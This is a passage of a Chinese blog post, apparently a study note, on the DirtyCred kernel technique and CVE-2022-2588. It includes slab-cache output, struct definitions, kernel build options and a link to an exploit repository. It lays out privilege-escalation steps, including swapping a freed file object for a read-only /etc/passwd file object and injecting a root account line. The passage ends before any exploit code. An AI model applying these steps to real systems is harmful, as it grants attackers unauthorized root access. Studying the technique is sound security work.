class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">shmem_inode_cache   <span class="number">2408</span>   <span class="number">2408</span>    <span class="number">760</span>   <span class="number">43</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kernfs_node_cache  <span class="number">71552</span>  <span class="number">71552</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mnt_cache           <span class="number">2900</span>   <span class="number">2900</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">filp               <span class="number">11820</span>  <span class="number">12096</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">inode_cache        <span class="number">44725</span>  <span class="number">44725</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dentry            <span class="number">149394</span> <span class="number">149394</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">names_cache          <span class="number">208</span>    <span class="number">208</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">net_namespace         <span class="number">49</span>     <span class="number">49</span>   <span class="number">4352</span>    <span class="number">7</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">iint_cache             <span class="number">0</span>      <span class="number">0</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">lsm_file_cache    <span class="number">123420</span> <span class="number">123420</span>     <span class="number">24</span>  <span class="number">170</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">uts_namespace        <span class="number">222</span>    <span class="number">222</span>    <span class="number">432</span>   <span class="number">37</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nsproxy              <span class="number">728</span>    <span class="number">728</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vm_area_struct     <span class="number">52371</span>  <span class="number">53079</span>    <span class="number">208</span>   <span class="number">39</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mm_struct            <span class="number">780</span>    <span class="number">780</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">files_cache          <span class="number">920</span>    <span class="number">920</span>    <span class="number">704</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">signal_cache        <span class="number">2027</span>   <span class="number">2044</span>   <span class="number">1152</span>   <span class="number">28</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sighand_cache       <span class="number">1245</span>   <span class="number">1245</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_struct         <span class="number">1130</span>   <span class="number">1176</span>   <span class="number">8064</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">cred_jar            <span class="number">6258</span>   <span class="number">6258</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma_chain     <span class="number">28659</span>  <span class="number">29184</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma           <span class="number">19422</span>  <span class="number">19422</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid                 <span class="number">3360</span>   <span class="number">3360</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-Operand       <span class="number">11928</span>  <span class="number">11928</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-ParseExt        <span class="number">429</span>    <span class="number">429</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-State          <span class="number">1326</span>   <span class="number">1326</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">numa_policy          <span class="number">155</span>    <span class="number">155</span>    <span class="number">264</span>   <span class="number">31</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">perf_event            <span class="number">27</span>     <span class="number">27</span>   <span class="number">1192</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">trace_event_file    <span class="number">3496</span>   <span class="number">3496</span>     <span class="number">88</span>   <span class="number">46</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ftrace_event_field  <span class="number">13090</span>  <span class="number">13090</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">pool_workqueue      <span class="number">3392</span>   <span class="number">3392</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">radix_tree_node    <span class="number">23380</span>  <span class="number">23380</span>    <span class="number">584</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_group           <span class="number">425</span>    <span class="number">425</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vmap_area          <span class="number">12359</span>  <span class="number">26624</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-128</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-64</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-96</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-128</span>      <span class="number">800</span>    <span class="number">800</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-96</span>      <span class="number">1386</span>   <span class="number">1386</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-64</span>      <span class="number">5824</span>   <span class="number">5824</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>k         <span class="number">60</span>     <span class="number">60</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-4</span>k        <span class="number">192</span>    <span class="number">216</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-2</span>k        <span class="number">272</span>    <span class="number">272</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-1</span>k       <span class="number">1113</span>   <span class="number">1248</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-512</span>      <span class="number">2498</span>   <span class="number">2688</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-256</span>       <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-192</span>       <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-128</span>       <span class="number">640</span>    <span class="number">640</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-96</span>        <span class="number">672</span>    <span class="number">672</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-64</span>       <span class="number">2112</span>   <span class="number">2112</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-32</span>       <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-16</span>       <span class="number">4608</span>   <span class="number">4608</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>        <span class="number">8192</span>   <span class="number">8192</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>k           <span class="number">244</span>    <span class="number">244</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-4</span>k          <span class="number">1860</span>   <span class="number">1872</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-2</span>k          <span class="number">2384</span>   <span class="number">2384</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-1</span>k          <span class="number">2968</span>   <span class="number">3008</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-512</span>        <span class="number">52767</span>  <span class="number">52768</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-256</span>         <span class="number">8879</span>   <span class="number">8960</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-192</span>         <span class="number">3486</span>   <span class="number">3486</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-128</span>         <span class="number">3419</span>   <span class="number">3424</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-96</span>          <span class="number">5482</span>   <span class="number">5754</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-64</span>         <span class="number">18368</span>  <span class="number">18368</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-32</span>         <span class="number">33152</span>  <span class="number">33152</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-16</span>         <span class="number">16640</span>  <span class="number">16640</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>          <span class="number">15872</span>  <span class="number">15872</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache_node      <span class="number">576</span>    <span class="number">576</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache           <span class="number">384</span>    <span class="number">384</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>generic cache</code>：在名称中带有 <code>kmalloc</code></li>
<li><code>dedicated cache</code>：拥有特殊的名字</li>
</ul>
<p><strong>Dirty Cred 漏洞利用</strong></p>
<p>大致步骤：</p>
<ul>
<li>释放存在漏洞的非特权凭据</li>
<li>在释放的内存插槽中分配特权凭据</li>
<li>以特权用户身份操作</li>
</ul>
<p>具体步骤：（本例是采用 <code>file</code> 对象完成利用，也可以采用 <code>cred</code> 对象）</p>
<ul>
<li>打开可写的文件 <code>/tmp/x</code>，就会分配可写的 <code>file</code> 对象，在通过写许可检查之后后，进行实际写操作之前暂停</li>
<li>利用漏洞释放该 <code>file</code> 对象</li>
<li>打开只读文件 <code>/etc/passwd</code>，就会分配新的 <code>file</code> 对象，占据旧的 <code>file</code> 对象，继续写入就能往只读文件写入内容（例如写入 <code>hacker:x:0:0:root:/:/bin/sh</code> 就能提权）</li>
</ul>
<p>CVE-2022-2588 漏洞点：</p>
<ul>
<li>将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致</li>
<li>导致该对象被释放后仍存于链表中</li>
</ul>
<p>安装 Kernel：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.19.1.tar.xz</span><br><span class="line">tar -xvf linux-5.19.1.tar.xz</span><br><span class="line">make menuconfig</span><br><span class="line">make x86_64_defconfig</span><br><span class="line">make bzImage -j32</span><br></pre></td></tr></table></figure>
<ul>
<li>怕麻烦的可以在如下网站中下载：<a target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-2588">kernel-exploit-factory/CVE-2022-2588 at main · bsauce/kernel-exploit-factory (github.com)</a> </li>
</ul>
<p>编译选项：</p>
<ul>
<li><strong>CONFIG_BINFMT_MISC=y</strong> （否则启动VM时报错）</li>
<li><strong>CONFIG_USER_NS=y</strong> （触发漏洞需要 User Namespace）</li>
<li><strong>CONFIG_NET_CLS_ROUTE4=y</strong> （漏洞函数所在的模块）</li>
<li><strong>CONFIG_DUMMY=y</strong> <strong>CONFIG_NET_SCH_QFQ=y</strong> （breezeO_o 提供的两个编译选项，触发 poc 需要用到）</li>
<li><strong>CONFIG_NET_CLS_ACT=y</strong> / <strong>CONFIG_NET_CLS_BASIC=y</strong> （默认已开启）</li>
<li><strong>CONFIG_NET_SCH_SFQ=y</strong> （exp 中触发漏洞需用到 sfq 随机公平队列）</li>
<li><strong>CONFIG_NET_EMATCH_META=y</strong> （exp 中堆喷对象时需要用到）</li>
</ul>
<p>Dirty Cred 所面对的挑战：</p>
<ol>
<li>如何将内存破坏漏洞，转换为能够置换 <code>file object</code> 的原语</li>
<li>如何延长文件的 权限检查-数据写入 的竞争窗口</li>
<li>如何创建高权限的 <code>file object</code>，来占据先前被释放的低权限 <code>file object</code> 内存空洞</li>
</ol>
<p>对应的解决措施：</p>
<ol>
<li>置换 <code>file object</code>：<ul>
<li>Out Of Bound Write：尝试越界写入下一个结构体的凭证字段，将其替换为高权限的凭证（例如：<code>request_key_auth-&gt;cred</code>）</li>
<li>Use After Free：使用高权限的凭证来“占据”低权限的凭证</li>
<li>Double Free：最终可以达到两个指针共同指向一个凭证的效果 </li>
</ul>
</li>
<li>延长竞争窗口：<ul>
<li>Userfaultfd：在多线程程序中，userfaultfd 允许一个线程管理其他线程所产生的 Page Fault 事件，当某个线程触发了 Page Fault，该线程将立即睡眠，而其他线程则可以通过 userfaultfd 来读取出这个 Page Fault 事件，并进行处理</li>
<li>FUSE：一个用户层文件系统框架，允许用户实现自己的文件系统，用户可以在该框架中注册 handler，来指定应对文件操作请求（可以在实际操作文件之前，执行 handler 暂停内核执行，尽可能地延长窗口）</li>
<li>File Lock：使用锁定暂停内核执行</li>
</ul>
</li>
<li>分配特权对象：<ul>
<li>大量执行 Set-UID 程序（例如 sudo），或者频繁创建特权级守护进程（例如 sshd），从而创建 privilege cred 结构体</li>
<li>使用 ReadOnly 方式来打开诸如 <code>/etc/passwd</code> 等特权文件</li>
<li>当内核创建新的 <code>kernel thread</code> 时，当前 <code>kernel thread</code> 将会被复制，于此同时其 <code>privileged cred</code> 结构体也会被拷贝一份</li>
</ul>
</li>
</ol>
<p>接下来看一看关键的代码：</p>
<ul>
<li><code>route4_filter</code> 对象：（大小为“144”，属于 <code>kmalloc-192</code> ）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tcf_exts</code> 对象的 <code>tc_action</code> 条目：（包含32个 <code>tc_action</code> 对象指针，属于 <code>kmalloc-256</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">	__u32	type; <span class="comment">/* for backward compat(TCA_OLD_COMPAT) */</span></span><br><span class="line">	<span class="keyword">int</span> nr_actions;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tc_action</span> **<span class="title">actions</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Map to export classifier specific extension TLV types to the</span></span><br><span class="line"><span class="comment">	 * generic extensions API. Unsupported extensions must be set to 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> action;</span><br><span class="line">	<span class="keyword">int</span> police;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>有漏洞的代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 